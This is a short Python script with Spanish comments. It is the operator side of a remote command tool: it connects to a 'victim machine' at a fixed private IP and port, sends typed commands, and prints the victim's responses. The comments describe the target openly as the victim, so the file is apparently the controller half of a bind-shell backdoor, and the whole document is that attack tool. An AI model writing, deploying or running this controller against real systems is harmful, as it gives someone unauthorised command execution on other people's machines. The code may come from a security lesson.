from socket import socket


# Definimos la dirección y puerto del servidor (Siempre de la máquina víctima)
server_address = ('192.168.6.38', 5000)

# Creamos el socket cliente, ya que restablecemos la conexión a cada comando que se ejecute
client_socket = socket()
client_socket.connect(server_address)
estado = True

while estado:

    # Solicitamos al usuario que introduzca un comando
    comando_enviar = input("Introduce el comando que quieras enviar a la máquina víctima (o 'exit' para salir): ")
    

    # Si el usuario introduce "exit", cerramos la conexión y salimos del bucle
    if comando_enviar == 'exit':
        # Le decimos al servidor que la conexion la cerramos:
        client_socket.send(comando_enviar.encode())
        # Cerramos el socket, que se volverá a abrir al inicio del bucle:
        client_socket.close()
        estado = False
    else:
        # Enviamos el comando a la máquina víctima:
        client_socket.send(comando_enviar.encode())

        # Esperamos a recibir la respuesta de la víctima y lo guardamos en la variable respuesta.
        respuesta = client_socket.recv(4096)

        # Imprimimos la respuesta;
        print(respuesta.decode()) 